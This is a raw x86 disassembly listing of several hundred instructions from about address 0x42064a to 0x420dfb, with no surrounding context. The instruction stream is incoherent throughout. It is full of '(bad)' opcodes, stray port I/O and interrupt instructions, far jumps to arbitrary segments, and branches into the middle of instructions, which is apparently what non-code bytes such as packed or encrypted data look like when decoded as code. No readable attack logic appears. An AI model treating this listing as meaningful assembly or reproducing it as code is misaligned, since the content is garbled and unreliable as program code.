  42064a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42064b:	sbb    DWORD PTR [eax+0x13],edx
  42064e:	dec    eax
  42064f:	cs jmp 0x4205eb
  420652:	pop    ebx
  420653:	rcr    ebx,0xc7
  420656:	sbb    eax,0x25aae125
  42065b:	lea    edi,[ebx+0x6f7dc70c]
  420661:	aaa    
  420662:	dec    esp
  420663:	mov    edx,0x3053a5a9
  420668:	adc    al,0xff
  42066a:	lods   al,BYTE PTR ds:[esi]
  42066b:	adc    cl,BYTE PTR [edi+0x9]
  42066e:	mov    eax,0x1d36cc11
  420673:	cmp    esp,edi
  420675:	nop
  420676:	mov    ebp,cs
  420678:	push   cs
  420679:	stc    
  42067a:	mov    bh,0xb
  42067c:	(bad)  
  42067d:	out    0x92,al
  42067f:	inc    esi
  420680:	fstp   TBYTE PTR [ebp+0x30]
  420683:	sbb    eax,0x64ba722c
  420688:	mov    ebx,0xcb1f1637
  42068d:	adc    dl,BYTE PTR [edx+0x6b33cb4f]
  420693:	iret   
  420694:	and    ah,BYTE PTR [ebx+ecx*4-0x4b328357]
  42069b:	xchg   edx,eax
  42069c:	jne    0x420662
  42069e:	push   0x3c
  4206a0:	xor    al,0x68
  4206a2:	out    dx,eax
  4206a3:	dec    edi
  4206a4:	xchg   ebx,eax
  4206a5:	push   ebp
  4206a6:	xor    BYTE PTR [edx+0x1],0x7e
  4206aa:	push   edi
  4206ab:	shl    ch,0xd0
  4206ae:	cs std 
  4206b0:	(bad)  
  4206b1:	loopne 0x420659
  4206b3:	mov    esi,0xab0591b8
  4206b8:	add    eax,DWORD PTR [edi+0x47]
  4206bb:	xchg   BYTE PTR [ebp+0x44],bh
  4206be:	dec    edx
  4206bf:	sti    
  4206c0:	stos   DWORD PTR es:[edi],eax
  4206c1:	lods   eax,DWORD PTR ds:[esi]
  4206c2:	push   edx
  4206c3:	or     edi,DWORD PTR [ecx+0x66662455]
  4206c9:	stc    
  4206ca:	pop    ds
  4206cb:	imul   ebp,DWORD PTR [edi-0x7d61b2f3],0x41690d4f
  4206d5:	mov    ebx,0x84435fbc
  4206da:	push   eax
  4206db:	xor    al,0x24
  4206dd:	addr16 inc ecx
  4206df:	mov    cl,0x16
  4206e1:	xchg   esp,eax
  4206e2:	scas   eax,DWORD PTR es:[edi]
  4206e3:	xchg   BYTE PTR [ecx],dh
  4206e5:	out    0xb3,eax
  4206e7:	mov    DWORD PTR [ebx+0x2f],esp
  4206ea:	push   eax
  4206eb:	mov    bl,0x86
  4206ed:	jno    0x4206c6
  4206ef:	xor    BYTE PTR [eax],ah
  4206f1:	pop    ecx
  4206f2:	mov    eax,0x27e0e569
  4206f7:	pop    es
  4206f8:	jb     0x42070d
  4206fa:	add    esp,DWORD PTR [ebx+0x1]
  4206fd:	dec    eax
  4206fe:	into   
  4206ff:	cs xchg ebp,eax
  420701:	jb     0x4206ed
  420703:	test   eax,0xb69f1da7
  420708:	sub    dh,BYTE PTR [ebp-0x388739c6]
  42070e:	inc    edx
  42070f:	sti    
  420710:	push   ebx
  420711:	cmc    
  420712:	inc    eax
  420713:	dec    edi
  420714:	(bad)  
  420715:	pop    ecx
  420716:	sahf   
  420717:	adc    bh,al
  420719:	mov    esi,esp
  42071b:	push   esp
  42071c:	pop    ss
  42071d:	pop    edi
  42071e:	mov    DWORD PTR [edi+0x5ffecf27],edx
  420724:	lahf   
  420725:	addr16 mov eax,0x1c88d671
  42072b:	ret    
  42072c:	(bad)  [edi+0x38]
  42072f:	jecxz  0x4206b7
  420731:	inc    eax
  420732:	js     0x420780
  420734:	ret    0x9da8
  420737:	test   al,0x95
  420739:	cmp    BYTE PTR [ebp-0x60d97e8b],bh
  42073f:	clc    
  420740:	jno    0x42077b
  420742:	sbb    al,0xe7
  420744:	or     DWORD PTR [esi-0x1e86d4d],ecx
  42074a:	popf   
  42074b:	jle    0x420794
  42074d:	jns    0x420763
  42074f:	rcr    DWORD PTR [eax+eiz*4+0x62],0x4c
  420754:	ja     0x4207c6
  420756:	adc    BYTE PTR [ecx-0x44],cl
  420759:	push   edx
  42075a:	add    bh,BYTE PTR [ecx]
  42075c:	dec    eax
  42075d:	mov    ds:0x3ec94795,al
  420762:	pop    ecx
  420763:	sbb    al,BYTE PTR [edx-0x1d4b574f]
  420769:	loope  0x4207bb
  42076b:	icebp  
  42076c:	mov    dh,0x17
  42076e:	jp     0x420737
  420770:	scas   eax,DWORD PTR es:[edi]
  420771:	cmc    
  420772:	push   0x72
  420774:	das    
  420775:	adc    ah,BYTE PTR [edi-0x36]
  420778:	add    ch,ah
  42077a:	fwait
  42077b:	data16 sbb WORD PTR [esi],si
  42077f:	gs inc esp
  420781:	push   ss
  420782:	pop    ebp
  420783:	js     0x188da4d
  420789:	adc    eax,DWORD PTR [esp+ebx*8]
  42078c:	js     0x42075d
  42078e:	add    BYTE PTR [ebx+0x6c],ch
  420791:	fmul   QWORD PTR [eax+eiz*8]
  420794:	scas   al,BYTE PTR es:[edi]
  420795:	sbb    edx,edi
  420797:	pop    esi
  420798:	xchg   esp,eax
  420799:	scas   eax,DWORD PTR es:[edi]
  42079a:	and    esi,DWORD PTR [ecx+0x3a0edc83]
  4207a0:	gs aam 0xfb
  4207a3:	pop    ebx
  4207a4:	or     BYTE PTR [edx+0x4e7b54b7],ah
  4207aa:	jae    0x4207ce
  4207ac:	xor    al,0x73
  4207ae:	mov    edi,DWORD PTR [edi-0xb8a11e]
  4207b4:	cmp    BYTE PTR [esi],dh
  4207b6:	and    al,0xff
  4207b8:	lea    edx,[edx-0x2e6e885b]
  4207be:	shr    DWORD PTR [ebp+eiz*4-0x1e92c3ad],0x30
  4207c6:	jg     0x420789
  4207c8:	(bad)  
  4207c9:	fdiv   DWORD PTR [edx+0x49ff4f3d]
  4207cf:	jge    0x42083c
  4207d1:	xchg   ebx,eax
  4207d2:	test   eax,0x8dbac54
  4207d7:	mov    edx,0x67a2514b
  4207dc:	add    dh,bl
  4207de:	adc    dl,ah
  4207e0:	jmp    edx
  4207e2:	(bad)  
  4207e4:	not    BYTE PTR ds:0xb630d089
  4207ea:	push   0x26249296
  4207ef:	mov    BYTE PTR [esi+eiz*8],0x31
  4207f3:	retf   
  4207f4:	sub    esi,DWORD PTR [edx]
  4207f6:	adc    eax,DWORD PTR [edx+ebp*2-0x3d]
  4207fa:	cmp    ah,bh
  4207fc:	push   esi
  4207fd:	rol    BYTE PTR [edi],0xcc
  420800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420801:	shl    DWORD PTR [edx],1
  420803:	xor    eax,0xf6251bf0
  420808:	fcom   DWORD PTR [eax]
  42080a:	(bad)  
  42080b:	fwait
  42080c:	push   ebp
  42080d:	cmp    al,0xbb
  42080f:	es int3 
  420811:	lahf   
  420812:	out    0xa6,eax
  420814:	(bad)  
  420815:	mov    ds,WORD PTR [edi+0x7da36299]
  42081b:	in     eax,dx
  42081c:	xor    al,0x65
  42081e:	jbe    0x4207ac
  420820:	sbb    DWORD PTR [ebx+0x6f8c21f3],esp
  420826:	daa    
  420827:	and    ebx,DWORD PTR ds:0xb5eafe9a
  42082d:	jo     0x420844
  42082f:	add    ch,BYTE PTR ds:0x8a1115a8
  420835:	or     ecx,DWORD PTR [ecx+0x28b359f9]
  42083b:	mov    bl,0xe8
  42083d:	pop    esi
  42083e:	aam    0x9e
  420840:	push   ebp
  420841:	adc    eax,0x7e5f4ed
  420846:	push   esi
  420847:	push   esi
  420848:	pop    edi
  420849:	cli    
  42084a:	fs pop es
  42084c:	push   esi
  42084d:	add    eax,0x1e302b72
  420852:	and    al,0xe0
  420854:	call   0x7fd7be38
  420859:	jno    0x420807
  42085b:	cmp    bl,BYTE PTR [eax+edi*8+0x283e6ff]
  420862:	xchg   DWORD PTR [esi],ecx
  420864:	in     al,0x4f
  420866:	xchg   DWORD PTR ds:0x3ef3a49d,edx
  42086c:	jns    0x420809
  42086e:	in     al,dx
  42086f:	std    
  420870:	(bad)  
  420871:	and    DWORD PTR [ecx],ecx
  420873:	sub    al,0x30
  420875:	xchg   ebx,eax
  420876:	add    cl,bl
  420878:	out    0xec,eax
  42087a:	adc    al,0x14
  42087c:	adc    DWORD PTR [edi],0xd4b7ff9a
  420882:	jecxz  0x420896
  420884:	inc    esp
  420885:	iret   
  420886:	outs   dx,DWORD PTR ds:[esi]
  420887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420888:	dec    esp
  420889:	cwde   
  42088a:	fnsave ds:0x5b9115c1
  420890:	test   edx,esp
  420892:	test   ebx,esp
  420894:	xlat   BYTE PTR ds:[ebx]
  420895:	mov    ebp,0x75e1f6e7
  42089a:	(bad)  
  42089b:	mov    esp,0xbf1fe7e2
  4208a0:	lds    ebp,FWORD PTR [ecx-0x739dc1f7]
  4208a6:	iret   
  4208a7:	jbe    0x4208f5
  4208a9:	(bad)  
  4208aa:	cs int 0x73
  4208ad:	stos   BYTE PTR es:[edi],al
  4208ae:	dec    esp
  4208af:	cli    
  4208b0:	xor    BYTE PTR [eax+0x15],ah
  4208b3:	shr    DWORD PTR [bp+0x5800],cl
  4208b8:	adc    eax,0x1f343bea
  4208bd:	les    eax,FWORD PTR [ebp-0x6c]
  4208c0:	fsubr  QWORD PTR [edx]
  4208c2:	or     DWORD PTR [esi],0x2f
  4208c5:	pop    ebp
  4208c6:	fcom   DWORD PTR [ecx+ecx*1-0x196000a0]
  4208cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208ce:	push   ebx
  4208cf:	in     al,dx
  4208d0:	je     0x420872
  4208d2:	push   ds
  4208d3:	sbb    edi,DWORD PTR [ecx+0x571e1583]
  4208d9:	jl     0x420921
  4208db:	jmp    0xd31c:0x32bdc13b
  4208e2:	test   al,0x3c
  4208e4:	mov    DWORD PTR [ebx+0x1c],ebp
  4208e7:	add    esi,edi
  4208e9:	inc    eax
  4208ea:	inc    DWORD PTR [esi+esi*4+0xebfec40]
  4208f1:	mov    WORD PTR [eax+0x5646e00e],ss
  4208f7:	sbb    eax,eax
  4208f9:	jmp    0x21fa2d9b
  4208fe:	xor    al,0x7e
  420900:	iret   
  420901:	imul   ebx,DWORD PTR [ebp+0x0],0xffffffe6
  420905:	fcom   DWORD PTR [ebp+0x72]
  420908:	mov    bh,0xd0
  42090a:	popa   
  42090b:	cmp    al,0xc4
  42090d:	jae    0x420943
  42090f:	xchg   edi,eax
  420910:	or     esp,edi
  420912:	enter  0x6a9d,0x9d
  420916:	sub    ah,BYTE PTR [edi]
  420918:	and    cl,bl
  42091a:	or     edi,DWORD PTR [eax+0x63948cbc]
  420920:	xchg   edi,eax
  420921:	xchg   ecx,eax
  420922:	mov    DWORD PTR [edi+0x6c26768f],0x1f41e5fb
  42092c:	jb     0x4208ea
  42092e:	mov    bl,0xd7
  420930:	imul   esi,edi,0x31
  420933:	leave  
  420934:	add    bh,dh
  420936:	push   ecx
  420937:	mov    cl,0xd9
  420939:	popa   
  42093a:	mov    ebx,0xb6169afa
  42093f:	mov    edi,0x2c790e4b
  420944:	push   es
  420945:	cmp    BYTE PTR [ecx],bh
  420947:	leave  
  420948:	lds    edx,FWORD PTR [ebx+0xf]
  42094b:	pushf  
  42094c:	in     al,0xe6
  42094e:	(bad)  
  420950:	pop    ds
  420951:	xor    DWORD PTR [eax+eiz*2-0x32],esp
  420955:	ja     0x4208da
  420957:	mov    ds:0x7248cdb5,eax
  42095c:	leave  
  42095d:	hlt    
  42095e:	scas   eax,DWORD PTR es:[edi]
  42095f:	push   esi
  420960:	dec    esp
  420961:	mov    ecx,0x1feb2a06
  420966:	lods   eax,DWORD PTR ds:[esi]
  420967:	test   DWORD PTR [ebx],esp
  420969:	(bad)  
  42096a:	rcr    DWORD PTR [ecx+ebp*1-0x33],1
  42096e:	pusha  
  42096f:	fisttp WORD PTR [esi+0x3d]
  420972:	(bad)  
  420973:	fst    st(7)
  420975:	jle    0x42096c
  420977:	ja     0x42099f
  420979:	clc    
  42097a:	xchg   ebp,eax
  42097b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42097c:	fsub   st(5),st
  42097e:	stos   DWORD PTR es:[edi],eax
  42097f:	xor    al,0x4c
  420981:	mov    bh,0xb7
  420983:	aad    0x1e
  420985:	sub    edi,DWORD PTR [esi]
  420987:	lea    esp,[edi-0x22dd6b6b]
  42098d:	xor    al,0xa0
  42098f:	mov    ecx,0x1fa53a52
  420994:	sahf   
  420995:	imul   ebx,DWORD PTR [ecx+ebp*8+0x13],0x76
  42099a:	jno    0x4209f9
  42099c:	in     al,dx
  42099d:	inc    ecx
  42099e:	mov    edi,0x911dd80
  4209a3:	dec    edi
  4209a4:	outs   dx,DWORD PTR ds:[esi]
  4209a5:	add    bh,BYTE PTR [ecx-0x7e1b7f8]
  4209ab:	ss pop es
  4209ad:	push   ebx
  4209ae:	mov    al,0xe8
  4209b0:	aad    0xb2
  4209b2:	or     eax,0xebbd5077
  4209b7:	popf   
  4209b8:	push   es
  4209b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209ba:	or     BYTE PTR [ebx],dl
  4209bc:	and    DWORD PTR [edx],esp
  4209be:	mov    eax,ds:0x9827e83b
  4209c3:	cmp    DWORD PTR [esi-0x7],edi
  4209c6:	rcl    BYTE PTR [ebp-0x19],1
  4209c9:	add    BYTE PTR [edx+edi*4],dh
  4209cc:	adc    al,0x28
  4209ce:	mov    ds:0xa9a1ed34,al
  4209d3:	leave  
  4209d4:	loopne 0x4209b8
  4209d6:	cmp    esi,DWORD PTR [ecx]
  4209d8:	lods   eax,DWORD PTR ds:[esi]
  4209d9:	push   esi
  4209da:	add    DWORD PTR [ebx+0x36b3b0d8],ecx
  4209e0:	pop    ds
  4209e1:	call   0x6787:0xd66c70d6
  4209e8:	or     DWORD PTR [ecx+eax*8+0x1ba156b2],esp
  4209ef:	mov    eax,0x7f4cf3ca
  4209f4:	push   ecx
  4209f5:	lds    ecx,FWORD PTR [esi+0x4e]
  4209f8:	xor    esi,DWORD PTR [ebx-0x58]
  4209fb:	jle    0x4209b4
  4209fd:	fs out dx,al
  4209ff:	test   eax,0x7ab67d22
  420a04:	add    al,0xf7
  420a06:	retf   0xbdc5
  420a09:	pop    ecx
  420a0a:	cdq    
  420a0b:	scas   eax,DWORD PTR es:[edi]
  420a0c:	mov    edi,0xf3753574
  420a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a12:	or     al,0xe3
  420a14:	das    
  420a15:	(bad)  
  420a16:	push   eax
  420a17:	mov    cl,0x4e
  420a19:	fisub  WORD PTR [eax]
  420a1b:	mov    cl,0x91
  420a1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a1e:	scas   eax,DWORD PTR es:[edi]
  420a1f:	dec    ebx
  420a20:	inc    edi
  420a21:	mov    eax,ds:0x3bf773d
  420a26:	(bad)  
  420a27:	icebp  
  420a28:	iret   
  420a29:	xchg   edx,eax
  420a2a:	loope  0x420a08
  420a2c:	or     BYTE PTR [eax],ch
  420a2e:	data16 je 0x420a42
  420a31:	dec    esi
  420a32:	pop    edx
  420a33:	xor    al,0xf
  420a36:	int3   
  420a37:	mov    ebx,0x519e6e1a
  420a3c:	out    dx,al
  420a3d:	imul   ebx
  420a3f:	jb     0x4209f9
  420a41:	fwait
  420a42:	mov    cl,0x34
  420a44:	dec    ebx
  420a45:	int    0x52
  420a47:	push   edi
  420a48:	or     al,0xa
  420a4a:	xchg   ecx,eax
  420a4b:	frstor [ebp+eiz*8-0x75]
  420a4f:	mov    edi,0xe4a109c
  420a54:	push   cs
  420a55:	stos   BYTE PTR es:[edi],al
  420a56:	fwait
  420a57:	xlat   BYTE PTR ds:[ebx]
  420a58:	mov    ebp,gs
  420a5a:	ins    BYTE PTR es:[edi],dx
  420a5b:	in     al,dx
  420a5c:	fisub  DWORD PTR [ebx+0x2c40abac]
  420a62:	sbb    al,0x69
  420a64:	adc    ecx,edi
  420a66:	icebp  
  420a67:	das    
  420a68:	cld    
  420a69:	call   0x6761f379
  420a6e:	sub    dh,0x46
  420a71:	in     al,dx
  420a72:	shl    DWORD PTR [ebx-0xc],0xc
  420a76:	inc    ecx
  420a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a78:	ins    BYTE PTR es:[edi],dx
  420a79:	retf   0xf071
  420a7c:	call   0xbdd8:0xdd6946e2
  420a83:	std    
  420a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a85:	sub    dl,al
  420a87:	int    0x36
  420a89:	ins    BYTE PTR es:[edi],dx
  420a8a:	sahf   
  420a8b:	or     ah,dh
  420a8d:	fisttp WORD PTR [edi+ebp*8+0x67]
  420a91:	js     0x420af6
  420a93:	xchg   BYTE PTR [edi+0x5a],dl
  420a96:	xchg   edx,eax
  420a97:	scas   al,BYTE PTR es:[edi]
  420a98:	mov    cl,ch
  420a9a:	jnp    0x420b0a
  420a9c:	push   cs
  420a9d:	fdivp  st(7),st
  420a9f:	jno    0x420ad9
  420aa1:	shl    BYTE PTR [edx+0x54],cl
  420aa4:	icebp  
  420aa5:	pop    ds
  420aa6:	iret   
  420aa7:	push   edx
  420aa8:	and    BYTE PTR [ecx+0x50b95d2d],cl
  420aae:	add    BYTE PTR [esi+0x35],ah
  420ab1:	ins    BYTE PTR es:[edi],dx
  420ab2:	inc    esi
  420ab3:	imul   esi,DWORD PTR [ebp-0x59db83f5],0x59
  420aba:	and    DWORD PTR [esi+0x75],0x21
  420abe:	mov    ah,0x17
  420ac0:	sbb    al,0x32
  420ac2:	pop    edi
  420ac3:	leave  
  420ac4:	cmp    DWORD PTR [edi+0x71],edi
  420ac7:	mov    ah,0x8f
  420ac9:	aas    
  420aca:	out    dx,eax
  420acb:	int    0x71
  420acd:	aam    0xff
  420acf:	push   eax
  420ad0:	adc    ebp,DWORD PTR [esi-0x16]
  420ad3:	jo     0x420a90
  420ad5:	mov    edx,0xb0971982
  420ada:	or     esp,esi
  420adc:	inc    ebx
  420add:	in     eax,dx
  420ade:	mov    ebp,0xeb4aefbf
  420ae3:	fild   WORD PTR [ebp-0x33]
  420ae6:	mov    ds:0x2907b51d,eax
  420aeb:	dec    ebx
  420aec:	pop    ebp
  420aed:	sbb    BYTE PTR [ebp+0x26],ah
  420af0:	cld    
  420af1:	es and eax,0x25d6ed04
  420af7:	leave  
  420af8:	std    
  420af9:	mov    BYTE PTR [edi+0x426e5d6b],bh
  420aff:	mov    ds:0x3905e8c9,al
  420b04:	ins    BYTE PTR es:[edi],dx
  420b05:	xor    al,BYTE PTR [esi+edi*1+0x7dabba91]
  420b0c:	adc    al,0x4d
  420b0e:	mov    edi,0xe080c304
  420b13:	jno    0x420ac0
  420b15:	loope  0x420ac4
  420b17:	pop    edx
  420b18:	cld    
  420b19:	in     eax,dx
  420b1a:	xor    BYTE PTR [ebx],al
  420b1c:	int    0x3e
  420b1e:	xchg   ecx,eax
  420b1f:	inc    ebp
  420b20:	(bad)  
  420b22:	and    eax,0xdfe46828
  420b27:	imul   ebp,DWORD PTR [ecx+0x54d35d9],0x29
  420b2e:	push   eax
  420b2f:	cmp    edi,eax
  420b31:	test   ebp,0xc960df3b
  420b37:	push   ss
  420b38:	push   edi
  420b39:	mov    dl,0xd9
  420b3b:	pop    ebp
  420b3c:	cmp    bl,BYTE PTR [edx+eiz*8-0x24d05047]
  420b43:	add    DWORD PTR [edx+0x451561f8],edi
  420b49:	sahf   
  420b4a:	ja     0x420b1d
  420b4c:	or     ch,0xdc
  420b4f:	cmc    
  420b50:	out    0x16,al
  420b52:	fs jae 0x420b92
  420b55:	pop    ebx
  420b56:	pusha  
  420b57:	cmc    
  420b58:	mov    BYTE PTR [ebx+0x41],0xac
  420b5c:	add    edx,DWORD PTR [edi]
  420b5e:	add    eax,0xbb8a94c3
  420b63:	mov    eax,DWORD PTR [ebp+0x18]
  420b66:	std    
  420b67:	std    
  420b68:	and    eax,0x9abc9f78
  420b6d:	adc    bl,dh
  420b6f:	(bad)  
  420b70:	pop    ebx
  420b71:	cld    
  420b72:	pushf  
  420b73:	cmc    
  420b74:	es popa 
  420b76:	ss (bad) 
  420b78:	sub    ebx,ecx
  420b7a:	push   ecx
  420b7b:	popa   
  420b7c:	rcr    BYTE PTR [ebp+0x3d],1
  420b7f:	push   0xfffffff1
  420b81:	mov    al,ds:0x89f9af43
  420b86:	sbb    al,0xa0
  420b88:	pop    eax
  420b8a:	cmp    eax,0x7f10d612
  420b8f:	enter  0xb714,0x8b
  420b93:	out    0xb1,eax
  420b95:	inc    edi
  420b96:	pop    edx
  420b97:	repz adc ebx,edx
  420b9a:	mov    edx,DWORD PTR [edi-0x80]
  420b9d:	rol    DWORD PTR [edx],cl
  420b9f:	add    BYTE PTR [ecx-0x5e3cc68e],cl
  420ba5:	push   0xffffff91
  420ba7:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ba9:	jge    0x420b49
  420bab:	mov    bh,0x70
  420bad:	dec    edx
  420bae:	pop    esi
  420baf:	push   0xb1e7f0d6
  420bb4:	scas   al,BYTE PTR es:[edi]
  420bb5:	js     0x420b3f
  420bb7:	outs   dx,BYTE PTR ds:[esi]
  420bb8:	sbb    DWORD PTR [ebx],esi
  420bba:	aam    0x94
  420bbc:	mov    esi,0x38e4f630
  420bc1:	pop    edx
  420bc2:	outs   dx,BYTE PTR ds:[esi]
  420bc3:	or     eax,0xe9b07c10
  420bc8:	xchg   ebx,eax
  420bc9:	shl    edi,0x82
  420bcc:	addr16 or eax,0x67ac4131
  420bd2:	adc    BYTE PTR [ecx+eiz*1+0x2af11195],dh
  420bd9:	push   ss
  420bda:	leave  
  420bdb:	aaa    
  420bdc:	add    ebp,DWORD PTR [edi+0x14]
  420bdf:	(bad)  
  420be0:	imul   eax,DWORD PTR [esi-0x2113efcd],0x7
  420be7:	sqrtps xmm6,xmm4
  420bea:	push   es
  420beb:	js     0x420c39
  420bed:	push   0xffffff8d
  420bef:	dec    ebp
  420bf0:	rcr    DWORD PTR [ebx-0x6d],1
  420bf3:	outs   dx,DWORD PTR ds:[esi]
  420bf4:	adc    esi,DWORD PTR [esi+0x26fd7aba]
  420bfa:	and    al,al
  420bfc:	mov    ah,0xca
  420bfe:	ss scas eax,DWORD PTR es:[edi]
  420c00:	inc    ebx
  420c01:	adc    eax,0xbb40ab97
  420c06:	sub    cl,ah
  420c08:	ds scas eax,DWORD PTR es:[edi]
  420c0a:	jl     0x420b97
  420c0c:	xchg   ebp,eax
  420c0d:	repnz test BYTE PTR [ecx+0x5c],bh
  420c11:	das    
  420c12:	fwait
  420c13:	(bad)  
  420c14:	cmc    
  420c15:	inc    ebx
  420c16:	mov    ds:0x8b9e7a5,eax
  420c1b:	ror    DWORD PTR [ecx],1
  420c1d:	pop    ebp
  420c1e:	mov    al,ds:0x440221c7
  420c23:	leave  
  420c24:	ins    DWORD PTR es:[edi],dx
  420c25:	pop    ds
  420c26:	pop    esp
  420c27:	jo     0x420ca8
  420c29:	dec    ebp
  420c2a:	in     al,0xcf
  420c2c:	ins    DWORD PTR es:[edi],dx
  420c2d:	jno    0x420c1c
  420c2f:	mov    ds:0x1d369572,al
  420c34:	mov    esp,DWORD PTR [esi+0x7087f03e]
  420c3a:	jb     0x420ca8
  420c3c:	adc    cl,BYTE PTR [ebp+0x586ef469]
  420c42:	mov    bh,0x9b
  420c44:	jecxz  0x420c01
  420c46:	mov    BYTE PTR [ecx+edi*4+0x31e3b75],dl
  420c4d:	ja     0x420c85
  420c4f:	int3   
  420c50:	adc    BYTE PTR cs:[esi],dh
  420c53:	dec    edi
  420c54:	ss fucomip st,st(7)
  420c57:	add    eax,0xb996d69f
  420c5c:	or     ecx,edi
  420c5e:	iret   
  420c5f:	cmp    DWORD PTR [esi-0x6b],edi
  420c62:	pop    ss
  420c63:	(bad)  
  420c64:	pop    esp
  420c65:	jle    0x420c0e
  420c67:	call   0x88edbc8
  420c6c:	std    
  420c6d:	lds    esi,FWORD PTR [ebx-0x6e]
  420c70:	outs   dx,DWORD PTR ds:[esi]
  420c71:	mov    ah,0x4c
  420c73:	ds xchg ebp,eax
  420c75:	in     eax,0xd6
  420c77:	aas    
  420c78:	nop
  420c79:	cmp    DWORD PTR [edx+0x22890a8f],esi
  420c7f:	addr16 xor al,0x6b
  420c82:	daa    
  420c83:	inc    ebp
  420c84:	sub    esp,DWORD PTR [edx]
  420c86:	retf   
  420c87:	mov    ?,WORD PTR [edx]
  420c89:	mov    DWORD PTR [ecx],eax
  420c8b:	fistp  DWORD PTR [ecx]
  420c8d:	retf   0xaef0
  420c90:	push   0x8f6839bb
  420c95:	les    eax,FWORD PTR [ecx+ecx*2+0x2780fb10]
  420c9c:	jo     0x420c79
  420c9e:	xchg   ebp,eax
  420c9f:	cli    
  420ca0:	sbb    ch,al
  420ca2:	jmp    0x6d83a6c9
  420ca7:	out    0xfc,al
  420ca9:	adc    edx,DWORD PTR [ecx]
  420cab:	mov    cl,BYTE PTR [ebp+0x75]
  420cae:	(bad)  
  420cb0:	(bad)  
  420cb1:	mulps  xmm3,XMMWORD PTR [ebx-0x5967c595]
  420cb8:	adc    eax,0xc6ffb75
  420cbd:	ss mov eax,0x2bd22096
  420cc3:	cmovbe eax,DWORD PTR [edi*2-0x72d0a69d]
  420ccb:	mov    DWORD PTR cs:[edx-0x47],esp
  420ccf:	ss push esp
  420cd1:	mov    esi,0x5c38e42f
  420cd6:	cwde   
  420cd7:	ficom  WORD PTR fs:[ebp+ebp*1-0x6]
  420cdc:	mov    edx,0xc4ff2dea
  420ce1:	cmp    DWORD PTR [edi+0x62],edi
  420ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ce5:	or     al,0xf6
  420ce7:	cld    
  420ce8:	jp     0x420c72
  420cea:	cdq    
  420ceb:	call   0x4be3:0x4ab954d1
  420cf2:	lahf   
  420cf3:	jge    0x420d5c
  420cf5:	mov    eax,ds:0xa8383726
  420cfa:	xchg   edi,eax
  420cfb:	test   BYTE PTR [esi],bl
  420cfd:	in     al,0xb
  420cff:	lock ror BYTE PTR [ebx+edx*1],cl
  420d03:	in     al,0xc4
  420d05:	jg     0x420cd2
  420d07:	fistp  QWORD PTR [eax+0xb071db6]
  420d0d:	xor    BYTE PTR [edx-0x10feada1],bh
  420d13:	in     eax,dx
  420d14:	sbb    al,0x1c
  420d16:	or     BYTE PTR [ebx-0xe9b3912],dl
  420d1c:	jmp    0xd95c:0x418b3731
  420d23:	mov    bl,0x16
  420d25:	cdq    
  420d26:	adc    al,0x8c
  420d28:	cmp    eax,0x3aef71d5
  420d2d:	in     al,dx
  420d2e:	cli    
  420d2f:	jmp    0x5bb7:0x608a1820
  420d36:	loopne 0x420cca
  420d38:	xor    al,0x68
  420d3a:	sub    ch,cl
  420d3c:	and    dh,BYTE PTR [esi-0x3d]
  420d3f:	pop    ebx
  420d40:	in     eax,dx
  420d41:	pop    ebp
  420d42:	(bad)  
  420d43:	(bad)  
  420d44:	out    0x93,eax
  420d46:	sub    al,0x37
  420d48:	pop    esi
  420d49:	dec    ebx
  420d4a:	xor    DWORD PTR [edx*2+0x7526d46c],esi
  420d51:	in     eax,0x35
  420d53:	lods   al,BYTE PTR ds:[esi]
  420d54:	mov    bl,0x4f
  420d56:	int3   
  420d57:	outs   dx,DWORD PTR ds:[esi]
  420d58:	lahf   
  420d59:	lock int3 
  420d5b:	xchg   edi,eax
  420d5c:	pushf  
  420d5d:	mov    eax,0x8a15f73f
  420d62:	in     eax,dx
  420d63:	jle    0x420d68
  420d65:	or     esp,DWORD PTR [eax-0x37]
  420d68:	sbb    BYTE PTR [edx+0x76],cl
  420d6b:	int    0x77
  420d6d:	sti    
  420d6e:	inc    esi
  420d6f:	push   es
  420d70:	cmp    eax,0x9fcf1127
  420d75:	adc    dh,BYTE PTR [edx]
  420d77:	fmul   QWORD PTR [ebx-0x42]
  420d7a:	idiv   BYTE PTR [ebx-0x1b3d79a6]
  420d80:	sub    ebp,edi
  420d82:	add    esi,DWORD PTR [edx+ebp*4-0x27f653f6]
  420d89:	pusha  
  420d8a:	pop    es
  420d8b:	jbe    0x420d2b
  420d8d:	jnp    0x420db3
  420d8f:	mov    al,0x82
  420d91:	mov    ds:0xb4758e94,al
  420d96:	test   edx,esi
  420d98:	dec    esi
  420d99:	and    al,BYTE PTR [ebp-0x336820e9]
  420d9f:	fisttp DWORD PTR [si]
  420da2:	pop    es
  420da3:	xorps  xmm7,xmm6
  420da6:	mov    ch,0xec
  420da8:	sub    eax,0xad8677b7
  420dad:	lds    edi,FWORD PTR ds:0xa0e195b0
  420db3:	ss (bad) 
  420db5:	aad    0xeb
  420db7:	pop    edi
  420db8:	pushf  
  420db9:	sub    eax,0xe27c1859
  420dbe:	pop    esp
  420dbf:	xchg   ebx,eax
  420dc0:	add    al,0x3c
  420dc2:	xchg   ebx,eax
  420dc3:	jnp    0x420d73
  420dc5:	int3   
  420dc6:	or     BYTE PTR [ecx+0x51215731],bh
  420dcc:	sbb    DWORD PTR [edx-0x2c87a991],ecx
  420dd2:	xor    al,0x25
  420dd4:	mov    DWORD PTR [eax+0x28],esi
  420dd7:	jg     0x420d7e
  420dd9:	shr    BYTE PTR [eax+0x43ae4e9d],0xa
  420de0:	in     eax,0x74
  420de2:	push   esi
  420de3:	sbb    cl,BYTE PTR [edi-0x640d264]
  420de9:	rol    BYTE PTR ds:0x5e43f955,1
  420def:	inc    ebx
  420df0:	sbb    eax,0xdf468dea
  420df5:	dec    ecx
  420df6:	cwde   
  420df7:	ds ret 
  420df9:	mov    ah,0x90
  420dfb:	mov    DWORD PTR [ebp-0x63],ebx
